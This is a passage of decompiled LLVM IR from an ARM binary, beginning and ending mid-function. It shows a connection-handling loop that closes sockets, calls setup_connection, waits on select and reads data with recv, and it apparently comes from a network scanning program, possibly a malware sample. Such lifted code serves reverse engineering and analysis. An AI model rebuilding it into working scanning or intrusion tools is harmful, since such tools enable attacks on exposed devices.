  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ed44

dec_label_pc_ed44:                                ; preds = %dec_label_pc_ed2c, %dec_label_pc_ecc4, %dec_label_pc_ebf0, %dec_label_pc_ebbc, %dec_label_pc_ed44.loopexit
  store i32 0, i32* %stack_var_-224, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1676, i32* %ip.global-to-local, align 4
  %v2_ed64513 = load i32, i32* @sp, align 4
  %v3_ed64514 = add i32 %v2_ed64513, 1676
  %v4_ed64515 = inttoptr i32 %v3_ed64514 to i32*
  store i32 0, i32* %v4_ed64515, align 4
  br label %dec_label_pc_ed50.dec_label_pc_ed50_crit_edge

dec_label_pc_ed50.dec_label_pc_ed50_crit_edge:    ; preds = %dec_label_pc_ed44, %dec_label_pc_ed50.dec_label_pc_ed50_crit_edge
  %v0_ed50.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_ed54 = add i32 %v0_ed50.pre, 4
  store i32 %v1_ed54, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_ed5c = add i32 %v0_ed50.pre, 1672
  store i32 %v1_ed5c, i32* %ip.global-to-local, align 4
  %v7_ed60 = icmp eq i32 %v1_ed54, 128
  %v2_ed64 = load i32, i32* @sp, align 4
  %v3_ed64 = add i32 %v2_ed64, %v1_ed5c
  %v4_ed64 = inttoptr i32 %v3_ed64 to i32*
  store i32 0, i32* %v4_ed64, align 4
  br i1 %v7_ed60, label %dec_label_pc_ed6c, label %dec_label_pc_ed50.dec_label_pc_ed50_crit_edge

dec_label_pc_ed6c:                                ; preds = %dec_label_pc_ed50.dec_label_pc_ed50_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_ed6c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_ed6c, i32* %stack_var_-352, align 4
  %v1_ed78516 = add i32 %v0_ed6c, 8
  store i32 %v1_ed78516, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_ed80517 = add i32 %v0_ed6c, 1548
  store i32 %v1_ed80517, i32* @lr, align 4
  %v7_ed84518 = icmp eq i32 %v1_ed78516, 128
  %v2_ed88519 = load i32, i32* @sp, align 4
  %v3_ed88520 = add i32 %v2_ed88519, %v1_ed80517
  %v4_ed88521 = inttoptr i32 %v3_ed88520 to i32*
  store i32 0, i32* %v4_ed88521, align 4
  br i1 %v7_ed84518, label %dec_label_pc_ed90, label %dec_label_pc_ed74.dec_label_pc_ed74_crit_edge

dec_label_pc_ed74.dec_label_pc_ed74_crit_edge:    ; preds = %dec_label_pc_ed6c, %dec_label_pc_ed74.dec_label_pc_ed74_crit_edge
  %v0_ed74.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_ed78 = add i32 %v0_ed74.pre, 4
  store i32 %v1_ed78, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_ed80 = add i32 %v0_ed74.pre, 1544
  store i32 %v1_ed80, i32* @lr, align 4
  %v7_ed84 = icmp eq i32 %v1_ed78, 128
  %v2_ed88 = load i32, i32* @sp, align 4
  %v3_ed88 = add i32 %v2_ed88, %v1_ed80
  %v4_ed88 = inttoptr i32 %v3_ed88 to i32*
  store i32 0, i32* %v4_ed88, align 4
  br i1 %v7_ed84, label %dec_label_pc_ed90, label %dec_label_pc_ed74.dec_label_pc_ed74_crit_edge

dec_label_pc_ed90:                                ; preds = %dec_label_pc_ed74.dec_label_pc_ed74_crit_edge, %dec_label_pc_ed6c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_ed90 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_ed90, i32* @r6, align 4
  store i32 %v0_ed90, i32* @r5, align 4
  store i32 %v0_ed90, i32* %stack_var_-52, align 4
  br label %dec_label_pc_edec

dec_label_pc_eda0:                                ; preds = %dec_label_pc_ee1c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ee08, i1* %cpsr_z.global-to-local, align 1
  %v1_ee8c = add i32 %v2_ee00, 4
  %v2_ee8c = inttoptr i32 %v1_ee8c to i32*
  %v3_ee8c = load i32, i32* %v2_ee8c, align 4
  br i1 %v7_ee08, label %dec_label_pc_ee8c, label %dec_label_pc_eda8

dec_label_pc_eda8:                                ; preds = %dec_label_pc_eda0
  store i32 %v3_ee8c, i32* %ip.global-to-local, align 4
  %v3_edac = udiv i32 %v3_ee8c, 32
  store i32 %v2_ee98, i32* %r0.global-to-local, align 4
  %v3_edb4 = mul nuw nsw i32 %v3_edac, 4
  %v2_edb8 = add i32 %v3_edb4, %v2_ee98
  store i32 %v2_edb8, i32* %r3.global-to-local, align 4
  %v1_edbc = add i32 %v2_edb8, -184
  %v2_edbc = inttoptr i32 %v1_edbc to i32*
  %v3_edbc = load i32, i32* %v2_edbc, align 4
  %v1_edc0 = urem i32 %v3_ee8c, 32
  store i32 %v1_edc0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_edc8 = shl i32 1, %v1_edc0
  %v8_edc8 = or i32 %v3_edbc, %v7_edc8
  store i32 %v8_edc8, i32* %r2.global-to-local, align 4
  store i32 %v8_edc8, i32* %v2_edbc, align 4
  %v0_edd0 = load i32, i32* @r6, align 4
  %v1_edd0 = load i32, i32* %ip.global-to-local, align 4
  %v3_edd0 = icmp uge i32 %v0_edd0, %v1_edd0
  store i1 %v3_edd0, i1* %cpsr_c.global-to-local, align 1
  %v9_edd0 = icmp eq i32 %v0_edd0, %v1_edd0
  store i1 %v9_edd0, i1* %cpsr_z.global-to-local, align 1
  %v5_edd4 = icmp slt i32 %v0_edd0, %v1_edd0
  br i1 %v5_edd4, label %bb409, label %bb410

bb409:                                            ; preds = %dec_label_pc_eda8
  store i32 %v1_edd0, i32* @r6, align 4
  br label %bb410

bb410:                                            ; preds = %.thread75, %bb416, %bb414, %bb418, %dec_label_pc_ee80, %dec_label_pc_eda8, %bb409
  %v3_edd8 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_edd8, i32* %r3.global-to-local, align 4
  %v1_eddc = add i32 %v3_edd8, 1
  store i32 %v1_eddc, i32* %r2.global-to-local, align 4
  %v2_ede0 = icmp ugt i32 %v1_eddc, 254
  store i1 %v2_ede0, i1* %cpsr_c.global-to-local, align 1
  %v7_ede0 = icmp eq i32 %v1_eddc, 255
  store i1 %v7_ede0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_eddc, i32* %stack_var_-52, align 4
  %v8_ede8 = icmp sgt i32 %v1_eddc, 255
  br i1 %v8_ede8, label %dec_label_pc_eebc, label %dec_label_pc_edec

dec_label_pc_edec:                                ; preds = %bb410, %dec_label_pc_ed90
  %v0_edf8 = phi i32 [ %v1_eddc, %bb410 ], [ %v0_ed90, %dec_label_pc_ed90 ]
  store i32 ptrtoint (i32* @global_var_24738.151 to i32), i32* %r0.global-to-local, align 4
  %v3_edf0 = mul i32 %v0_edf8, 256
  store i32 %v3_edf0, i32* %r3.global-to-local, align 4
  %v2_edf4 = load i32, i32* @global_var_24738.151, align 4
  store i32 %v2_edf4, i32* @r1, align 4
  %v2_edfc = mul i32 %v0_edf8, 288
  store i32 %v2_edfc, i32* %r2.global-to-local, align 4
  %v2_ee00 = add i32 %v2_edf4, %v2_edfc
  store i32 %v2_ee00, i32* @r4, align 4
  %v1_ee04 = add i32 %v2_ee00, 12
  %v2_ee04 = inttoptr i32 %v1_ee04 to i32*
  %v3_ee04 = load i32, i32* %v2_ee04, align 4
  store i32 %v3_ee04, i32* %ip.global-to-local, align 4
  %v2_ee08 = icmp ne i32 %v3_ee04, 0
  store i1 %v2_ee08, i1* %cpsr_c.global-to-local, align 1
  %v7_ee08 = icmp eq i32 %v3_ee04, 1
  store i1 %v7_ee08, i1* %cpsr_z.global-to-local, align 1
  %v2_ee0c = xor i1 %v2_ee08, true
  %v3_ee0c = or i1 %v7_ee08, %v2_ee0c
  br i1 %v3_ee0c, label %bb411, label %bb412

bb411:                                            ; preds = %dec_label_pc_edec
  store i32 5, i32* @r1, align 4
  br label %bb412

bb412:                                            ; preds = %dec_label_pc_edec, %bb411
  %v1_ee2c215 = phi i32 [ %v2_edf4, %dec_label_pc_edec ], [ 5, %bb411 ]
  %v2_ee10 = xor i1 %v7_ee08, true
  %v3_ee10 = and i1 %v2_ee08, %v2_ee10
  br i1 %v3_ee10, label %bb413, label %bb414

bb413:                                            ; preds = %bb412
  store i32 30, i32* @r1, align 4
  br label %bb414

bb414:                                            ; preds = %bb412, %bb413
  %v1_ee2c = phi i32 [ %v1_ee2c215, %bb412 ], [ 30, %bb413 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee14 = icmp eq i32 %v3_ee04, 0
  store i1 %v2_ee14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee14, label %bb410, label %dec_label_pc_ee1c

dec_label_pc_ee1c:                                ; preds = %bb414
  store i32 ptrtoint (i32* @global_var_21c54.139 to i32), i32* %r2.global-to-local, align 4
  %v2_ee20 = load i32, i32* @global_var_21c54.139, align 4
  store i32 %v2_ee20, i32* %r3.global-to-local, align 4
  %v1_ee24 = add i32 %v2_ee00, 8
  %v2_ee24 = inttoptr i32 %v1_ee24 to i32*
  %v3_ee24 = load i32, i32* %v2_ee24, align 4
  store i32 %v3_ee24, i32* %r2.global-to-local, align 4
  %v2_ee28 = sub i32 %v2_ee20, %v3_ee24
  store i32 %v2_ee28, i32* %r3.global-to-local, align 4
  %v3_ee2c = icmp uge i32 %v2_ee28, %v1_ee2c
  store i1 %v3_ee2c, i1* %cpsr_c.global-to-local, align 1
  %v9_ee2c = icmp eq i32 %v2_ee28, %v1_ee2c
  store i1 %v9_ee2c, i1* %cpsr_z.global-to-local, align 1
  %v2_ee30 = xor i1 %v3_ee2c, true
  %v3_ee30 = or i1 %v9_ee2c, %v2_ee30
  br i1 %v3_ee30, label %dec_label_pc_eda0, label %dec_label_pc_ee34

dec_label_pc_ee34:                                ; preds = %dec_label_pc_ee1c
  %v1_ee34 = add i32 %v2_ee00, 4
  %v2_ee34 = inttoptr i32 %v1_ee34 to i32*
  %v3_ee34 = load i32, i32* %v2_ee34, align 4
  store i32 %v3_ee34, i32* %r0.global-to-local, align 4
  %v1_ee38 = call i32 @__GI___libc_close(i32 %v3_ee34)
  store i32 %v1_ee38, i32* %r0.global-to-local, align 4
  %v0_ee3c = load i32, i32* @r4, align 4
  %v1_ee3c = add i32 %v0_ee3c, 12
  %v2_ee3c = inttoptr i32 %v1_ee3c to i32*
  %v3_ee3c = load i32, i32* %v2_ee3c, align 4
  store i32 %v3_ee3c, i32* %r3.global-to-local, align 4
  %v2_ee40 = icmp ugt i32 %v3_ee3c, 1
  store i1 %v2_ee40, i1* %cpsr_c.global-to-local, align 1
  %v7_ee40 = icmp eq i32 %v3_ee3c, 2
  store i1 %v7_ee40, i1* %cpsr_z.global-to-local, align 1
  %v2_ee44 = xor i1 %v2_ee40, true
  %v3_ee44 = or i1 %v7_ee40, %v2_ee44
  br i1 %v3_ee44, label %bb415, label %.thread301

.thread301:                                       ; preds = %dec_label_pc_ee34
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_ee4c298302 = add i32 %v0_ee3c, 4
  %v3_ee4c299303 = inttoptr i32 %v2_ee4c298302 to i32*
  store i32 -1, i32* %v3_ee4c299303, align 4
  br label %bb416

bb415:                                            ; preds = %dec_label_pc_ee34
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_ee4c295 = add i32 %v0_ee3c, 4
  %v3_ee4c296 = inttoptr i32 %v2_ee4c295 to i32*
  store i32 -1, i32* %v3_ee4c296, align 4
  %v4_ee50 = load i32, i32* %r3.global-to-local, align 4
  %v5_ee50 = load i32, i32* @r4, align 4
  %v6_ee50 = add i32 %v5_ee50, 12
  %v7_ee50 = inttoptr i32 %v6_ee50 to i32*
  store i32 %v4_ee50, i32* %v7_ee50, align 4
  %v4_ee54 = load i32, i32* %r3.global-to-local, align 4
  %v5_ee54 = trunc i32 %v4_ee54 to i8
  %v6_ee54 = load i32, i32* @r4, align 4
  %v7_ee54 = add i32 %v6_ee54, 284
  %v8_ee54 = inttoptr i32 %v7_ee54 to i8*
  store i8 %v5_ee54, i8* %v8_ee54, align 1
  %v0_ee58.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_ee58.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb416

bb416:                                            ; preds = %.thread301, %bb415
  %v1_ee58 = phi i1 [ %v1_ee58.pre, %bb415 ], [ %v2_ee40, %.thread301 ]
  %v0_ee58 = phi i1 [ %v0_ee58.pre, %bb415 ], [ false, %.thread301 ]
  %v2_ee58 = xor i1 %v1_ee58, true
  %v3_ee58 = or i1 %v0_ee58, %v2_ee58
  br i1 %v3_ee58, label %bb410, label %dec_label_pc_ee5c

dec_label_pc_ee5c:                                ; preds = %bb416
  %v0_ee5c = load i32, i32* @r4, align 4
  %v1_ee5c = add i32 %v0_ee5c, 284
  %v2_ee5c = inttoptr i32 %v1_ee5c to i8*
  %v3_ee5c = load i8, i8* %v2_ee5c, align 1
  %v4_ee5c = zext i8 %v3_ee5c to i32
  %v1_ee60 = add nuw nsw i32 %v4_ee5c, 1
  %v1_ee64 = urem i32 %v1_ee60, 256
  store i32 %v1_ee64, i32* %r3.global-to-local, align 4
  %v2_ee68 = icmp ugt i32 %v1_ee64, 9
  store i1 %v2_ee68, i1* %cpsr_c.global-to-local, align 1
  %v7_ee68 = icmp eq i32 %v1_ee64, 10
  store i1 %v7_ee68, i1* %cpsr_z.global-to-local, align 1
  %v1_ee6c = trunc i32 %v1_ee60 to i8
  store i8 %v1_ee6c, i8* %v2_ee5c, align 1
  %v0_ee70 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ee70, label %.thread75, label %dec_label_pc_ee80

.thread75:                                        ; preds = %dec_label_pc_ee5c
  %v1_ee70 = load i32, i32* %r3.global-to-local, align 4
  %v2_ee70 = add i32 %v1_ee70, -10
  store i32 %v2_ee70, i32* %r3.global-to-local, align 4
  %v2_ee74 = load i32, i32* @r4, align 4
  %v3_ee74 = add i32 %v2_ee74, 12
  %v4_ee74 = inttoptr i32 %v3_ee74 to i32*
  store i32 %v2_ee70, i32* %v4_ee74, align 4
  %v1_ee78 = load i32, i32* %r3.global-to-local, align 4
  %v2_ee78 = trunc i32 %v1_ee78 to i8
  %v3_ee78 = load i32, i32* @r4, align 4
  %v4_ee78 = add i32 %v3_ee78, 284
  %v5_ee78 = inttoptr i32 %v4_ee78 to i8*
  store i8 %v2_ee78, i8* %v5_ee78, align 1
  %v0_ee7c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ee7c.pr.pr, label %bb410, label %dec_label_pc_ee80

dec_label_pc_ee80:                                ; preds = %dec_label_pc_ee5c, %.thread75
  %v0_ee80 = load i32, i32* @r4, align 4
  store i32 %v0_ee80, i32* @r0, align 4
  %v0_ee84 = call i32 @setup_connection()
  store i32 %v0_ee84, i32* %r0.global-to-local, align 4
  br label %bb410

dec_label_pc_ee8c:                                ; preds = %dec_label_pc_eda0
  store i32 %v3_ee8c, i32* %r0.global-to-local, align 4
  %v3_ee90 = udiv i32 %v3_ee8c, 32
  %v3_ee94 = mul nuw nsw i32 %v3_ee90, 4
  store i32 %v2_ee98, i32* @lr, align 4
  %v2_ee9c = add i32 %v3_ee94, %v2_ee98
  store i32 %v2_ee9c, i32* %r3.global-to-local, align 4
  %v1_eea0 = add i32 %v2_ee9c, -312
  %v2_eea0 = inttoptr i32 %v1_eea0 to i32*
  %v3_eea0 = load i32, i32* %v2_eea0, align 4
  %v1_eea4 = urem i32 %v3_ee8c, 32
  store i32 %v1_eea4, i32* %r1.global-to-local, align 4
  %v7_eea8 = shl i32 1, %v1_eea4
  %v8_eea8 = or i32 %v3_eea0, %v7_eea8
  store i32 %v8_eea8, i32* %r2.global-to-local, align 4
  %v0_eeac = load i32, i32* @r5, align 4
  %v3_eeac = icmp uge i32 %v0_eeac, %v3_ee8c
  store i1 %v3_eeac, i1* %cpsr_c.global-to-local, align 1
  %v9_eeac = icmp eq i32 %v0_eeac, %v3_ee8c
  store i1 %v9_eeac, i1* %cpsr_z.global-to-local, align 1
  %v5_eeb0 = icmp slt i32 %v0_eeac, %v3_ee8c
  br i1 %v5_eeb0, label %bb417, label %bb418

bb417:                                            ; preds = %dec_label_pc_ee8c
  store i32 %v3_ee8c, i32* @r5, align 4
  br label %bb418

bb418:                                            ; preds = %dec_label_pc_ee8c, %bb417
  store i32 %v8_eea8, i32* %v2_eea0, align 4
  br label %bb410

dec_label_pc_eebc:                                ; preds = %bb410
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %stack_var_-68, align 4
  %v0_eec8 = load i32, i32* @r5, align 4
  %v1_eec8 = load i32, i32* @r6, align 4
  %v3_eec8 = icmp uge i32 %v0_eec8, %v1_eec8
  store i1 %v3_eec8, i1* %cpsr_c.global-to-local, align 1
  %v9_eec8 = icmp eq i32 %v0_eec8, %v1_eec8
  store i1 %v9_eec8, i1* %cpsr_z.global-to-local, align 1
  %v5_eecc = icmp slt i32 %v0_eec8, %v1_eec8
  %storemerge155 = select i1 %v5_eecc, i32 %v1_eec8, i32 %v0_eec8
  store i32 %v2_eee0, i32* %ip.global-to-local, align 4
  store i32 %v2_eee4, i32* %r1.global-to-local, align 4
  store i32 %v2_eee8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_eef0 = add i32 %storemerge155, 1
  store i32 %v1_eef0, i32* %r0.global-to-local, align 4
  %v5_eefc = call i32 @__libc_select(i32 %v1_eef0, i32 %v2_eee4, i32 %v2_eee8, i32 0, i32 %v2_eee0)
  %v0_ef00 = load i32, i32* @r4, align 4
  store i32 %v0_ef00, i32* %r0.global-to-local, align 4
  %v1_ef04 = inttoptr i32 %v0_ef00 to i32*
  %v2_ef04 = call i32 @__GI_time(i32* %v1_ef04)
  store i32 %v2_ef04, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21c54.139 to i32), i32* @lr, align 4
  %v0_ef0c = load i32, i32* @r4, align 4
  store i32 %v0_ef0c, i32* %stack_var_-52, align 4
  store i32 %v2_ef04, i32* @global_var_21c54.139, align 4
  br label %dec_label_pc_ef14

dec_label_pc_ef14:                                ; preds = %dec_label_pc_f07c, %dec_label_pc_eebc
  %v0_ef20 = phi i32 [ %v1_f080, %dec_label_pc_f07c ], [ %v0_ef0c, %dec_label_pc_eebc ]
  store i32 ptrtoint (i32* @global_var_24738.151 to i32), i32* %r0.global-to-local, align 4
  %v3_ef18 = mul i32 %v0_ef20, 256
  store i32 %v3_ef18, i32* %r3.global-to-local, align 4
  %v2_ef1c = load i32, i32* @global_var_24738.151, align 4
  store i32 %v2_ef1c, i32* %r1.global-to-local, align 4
  %v2_ef24 = mul i32 %v0_ef20, 288
  store i32 %v2_ef24, i32* %r2.global-to-local, align 4
  %v2_ef28 = add i32 %v2_ef1c, %v2_ef24
  store i32 %v2_ef28, i32* @r6, align 4
  %v1_ef2c = add i32 %v2_ef28, 4
  %v2_ef2c = inttoptr i32 %v1_ef2c to i32*
  %v3_ef2c = load i32, i32* %v2_ef2c, align 4
  store i32 %v3_ef2c, i32* %r0.global-to-local, align 4
  %v2_ef30 = icmp eq i32 %v3_ef2c, -1
  store i1 %v2_ef30, i1* %cpsr_c.global-to-local, align 1
  %v7_ef30 = icmp eq i32 %v3_ef2c, -1
  store i1 %v7_ef30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef30, label %dec_label_pc_f07c, label %dec_label_pc_ef38

dec_label_pc_ef38:                                ; preds = %dec_label_pc_ef14
  %v3_ef38 = udiv i32 %v3_ef2c, 32
  store i32 %v2_ee98, i32* %r1.global-to-local, align 4
  %v3_ef40 = mul nuw nsw i32 %v3_ef38, 4
  store i32 %v3_ef40, i32* @ip, align 4
  %v2_ef44 = add i32 %v3_ef40, %v2_ee98
  store i32 %v2_ef44, i32* %r2.global-to-local, align 4
  %v1_ef48 = add i32 %v2_ef44, -312
  %v2_ef48 = inttoptr i32 %v1_ef48 to i32*
  %v3_ef48 = load i32, i32* %v2_ef48, align 4
  %v1_ef4c = urem i32 %v3_ef2c, 32
  store i32 %v1_ef4c, i32* %r1.global-to-local, align 4
  %v2_ef50 = add nsw i32 %v1_ef4c, -1
  %v3_ef50 = shl i32 1, %v2_ef50
  %v4_ef50 = and i32 %v3_ef48, %v3_ef50
  %v5_ef50 = icmp ne i32 %v4_ef50, 0
  store i1 %v5_ef50, i1* %cpsr_c.global-to-local, align 1
  %v6_ef50 = ashr i32 %v3_ef48, %v1_ef4c
  store i32 %v6_ef50, i32* %r3.global-to-local, align 4
  %v1_ef54 = urem i32 %v6_ef50, 2
  %v2_ef54 = icmp eq i32 %v1_ef54, 0
  store i1 %v2_ef54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef54, label %dec_label_pc_ef5c, label %dec_label_pc_fa84

dec_label_pc_ef5c:                                ; preds = %dec_label_pc_ef38, %dec_label_pc_fb30
  %v1_ef68 = phi i32 [ %v1_ef4c, %dec_label_pc_ef38 ], [ %v1_ef68.pre, %dec_label_pc_fb30 ]
  %v0_ef60 = phi i32 [ %v3_ef40, %dec_label_pc_ef38 ], [ %v0_ef60.pre, %dec_label_pc_fb30 ]
  store i32 %v2_ee98, i32* @lr, align 4
  %v2_ef60 = add i32 %v0_ef60, %v2_ee98
  store i32 %v2_ef60, i32* %r2.global-to-local, align 4
  %v1_ef64 = add i32 %v2_ef60, -184
  %v2_ef64 = inttoptr i32 %v1_ef64 to i32*
  %v3_ef64 = load i32, i32* %v2_ef64, align 4
  %v2_ef68 = add i32 %v1_ef68, -1
  %v3_ef68 = shl i32 1, %v2_ef68
  %v4_ef68 = and i32 %v3_ef64, %v3_ef68
  %v5_ef68 = icmp ne i32 %v4_ef68, 0
  store i1 %v5_ef68, i1* %cpsr_c.global-to-local, align 1
  %v6_ef68 = ashr i32 %v3_ef64, %v1_ef68
  store i32 %v6_ef68, i32* %r3.global-to-local, align 4
  %v1_ef6c = urem i32 %v6_ef68, 2
  %v2_ef6c = icmp eq i32 %v1_ef6c, 0
  store i1 %v2_ef6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef6c, label %dec_label_pc_f07c, label %dec_label_pc_ef74.preheader

dec_label_pc_ef74.preheader:                      ; preds = %dec_label_pc_ef5c
  %v0_ef74176 = load i32, i32* @r6, align 4
  %v1_ef74177 = add i32 %v0_ef74176, 12
  %v2_ef74178 = inttoptr i32 %v1_ef74177 to i32*
  %v3_ef74179 = load i32, i32* %v2_ef74178, align 4
  store i32 %v3_ef74179, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef78175181 = icmp eq i32 %v3_ef74179, 0
  store i1 %v2_ef78175181, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef78175181, label %dec_label_pc_f07c, label %dec_label_pc_ef80.lr.ph

dec_label_pc_ef74.loopexit:                       ; preds = %dec_label_pc_f988, %dec_label_pc_f78c
  %v0_ef74 = load i32, i32* @r6, align 4
  %v1_ef74 = add i32 %v0_ef74, 12
  %v2_ef74 = inttoptr i32 %v1_ef74 to i32*
  %v3_ef74 = load i32, i32* %v2_ef74, align 4
  store i32 %v3_ef74, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef78175 = icmp eq i32 %v3_ef74, 0
  store i1 %v2_ef78175, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef78175, label %dec_label_pc_f07c, label %dec_label_pc_ef80.lr.ph

dec_label_pc_ef80.lr.ph:                          ; preds = %dec_label_pc_ef74.preheader, %dec_label_pc_ef74.loopexit
  %v0_ef80231 = phi i32 [ %v0_ef74, %dec_label_pc_ef74.loopexit ], [ %v0_ef74176, %dec_label_pc_ef74.preheader ]
  br label %dec_label_pc_ef80

dec_label_pc_ef80:                                ; preds = %dec_label_pc_ef78.backedge.thread, %dec_label_pc_ef78.backedge, %dec_label_pc_ef78.backedge.thread561, %dec_label_pc_ef80.lr.ph
  %v0_fa54 = phi i32 [ %v0_ef80231, %dec_label_pc_ef80.lr.ph ], [ %v0_ef80228, %dec_label_pc_ef78.backedge ], [ %v0_eff4, %dec_label_pc_ef78.backedge.thread ], [ %v0_eff4, %dec_label_pc_ef78.backedge.thread561 ]
  %v1_ef80 = add i32 %v0_fa54, 24
  %v2_ef80 = inttoptr i32 %v1_ef80 to i32*
  %v3_ef80 = load i32, i32* %v2_ef80, align 4
  store i32 %v3_ef80, i32* @r3, align 4
  %v2_ef84 = icmp ugt i32 %v3_ef80, 255
  store i1 %v2_ef84, i1* %cpsr_c.global-to-local, align 1
  %v7_ef84 = icmp eq i32 %v3_ef80, 256
  store i1 %v7_ef84, i1* %cpsr_z.global-to-local, align 1
  %.pre282 = add i32 %v0_fa54, 28
  store i32 %.pre282, i32* @sb, align 4
  br i1 %v7_ef84, label %dec_label_pc_fa54, label %dec_label_pc_ef90

dec_label_pc_ef90:                                ; preds = %dec_label_pc_ef80, %dec_label_pc_fa54
  store i32 0, i32* @r5, align 4
  %v1_ef94 = load i32, i32* @fp, align 4
  %v2_ef94 = inttoptr i32 %v1_ef94 to i32*
  store i32 0, i32* %v2_ef94, align 4
  %v0_ef98 = load i32, i32* @r6, align 4
  %v1_ef98 = add i32 %v0_ef98, 24
  %v2_ef98 = inttoptr i32 %v1_ef98 to i32*
  %v3_ef98 = load i32, i32* %v2_ef98, align 4
  store i32 %v3_ef98, i32* %r2.global-to-local, align 4
  %v0_ef9c = load i32, i32* @sb, align 4
  %v2_ef9c = add i32 %v0_ef9c, %v3_ef98
  store i32 %v2_ef9c, i32* @r4, align 4
  %v1_efa0 = add i32 %v0_ef98, 4
  %v2_efa0 = inttoptr i32 %v1_efa0 to i32*
  %v3_efa0 = load i32, i32* %v2_efa0, align 4
  store i32 %v3_efa0, i32* %r0.global-to-local, align 4
  %v1_efa4 = sub i32 256, %v3_ef98
  store i32 %v1_efa4, i32* %r2.global-to-local, align 4
  store i32 %v2_ef9c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_efb0 = call i32 @__libc_recv(i32 %v3_efa0, i32 %v2_ef9c, i32 %v1_efa4, i32 16384)
  store i32 %v4_efb0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_efb4 = icmp eq i32 %v4_efb0, 0
  store i1 %v2_efb4, i1* %cpsr_z.global-to-local, align 1
  %tmp419 = icmp slt i32 %v4_efb0, 1
  br i1 %tmp419, label %dec_label_pc_f02c, label %dec_label_pc_efbc

dec_label_pc_efbc:                                ; preds = %dec_label_pc_ef90
  %v0_efbc = load i32, i32* @r5, align 4
  store i32 %v0_efbc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_efc0

dec_label_pc_efc0:                                ; preds = %.thread82, %dec_label_pc_efbc
  %v3_efcc = phi i32 [ %v1_efd0, %.thread82 ], [ %v0_efbc, %dec_label_pc_efbc ]
  %v1_efc0 = load i32, i32* @r4, align 4
  %v2_efc0 = add i32 %v1_efc0, %v3_efcc
  %v3_efc0 = inttoptr i32 %v2_efc0 to i8*
  %v4_efc0 = load i8, i8* %v3_efc0, align 1
  %v6_efc0 = zext i8 %v4_efc0 to i32
  store i32 %v6_efc0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_efc4 = icmp eq i8 %v4_efc0, 0
  store i1 %v2_efc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_efc4, label %bb420, label %.thread82

bb420:                                            ; preds = %dec_label_pc_efc0
  %v2_efc8 = add nuw nsw i32 %v6_efc0, 65
  store i32 %v2_efc8, i32* %r3.global-to-local, align 4
  %v2_efcc = trunc i32 %v2_efc8 to i8
  store i8 %v2_efcc, i8* %v3_efc0, align 1
  %v0_efd0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread82

.thread82:                                        ; preds = %dec_label_pc_efc0, %bb420
  %v0_efd0 = phi i32 [ %v3_efcc, %dec_label_pc_efc0 ], [ %v0_efd0.pre, %bb420 ]
  %v1_efd0 = add i32 %v0_efd0, 1
  store i32 %v1_efd0, i32* %r2.global-to-local, align 4
  %v3_efd4 = icmp uge i32 %v1_efd0, %v4_efb0
  store i1 %v3_efd4, i1* %cpsr_c.global-to-local, align 1
  %v9_efd4 = icmp eq i32 %v1_efd0, %v4_efb0
  store i1 %v9_efd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_efd4, label %dec_label_pc_efdc, label %dec_label_pc_efc0

dec_label_pc_efdc:                                ; preds = %.thread82, %dec_label_pc_f030
  store i32 ptrtoint (i32* @global_var_21c54.139 to i32), i32* %r1.global-to-local, align 4
  %v0_efe0 = load i32, i32* @r6, align 4
  %v1_efe0 = add i32 %v0_efe0, 24
  %v2_efe0 = inttoptr i32 %v1_efe0 to i32*
  %v3_efe0 = load i32, i32* %v2_efe0, align 4
  %v2_efe4 = load i32, i32* @global_var_21c54.139, align 4
  store i32 %v2_efe4, i32* %r2.global-to-local, align 4
  %v2_efe8 = add i32 %v3_efe0, %v4_efb0
  store i32 %v2_efe8, i32* %r3.global-to-local, align 4
  store i32 %v2_efe8, i32* %v2_efe0, align 4
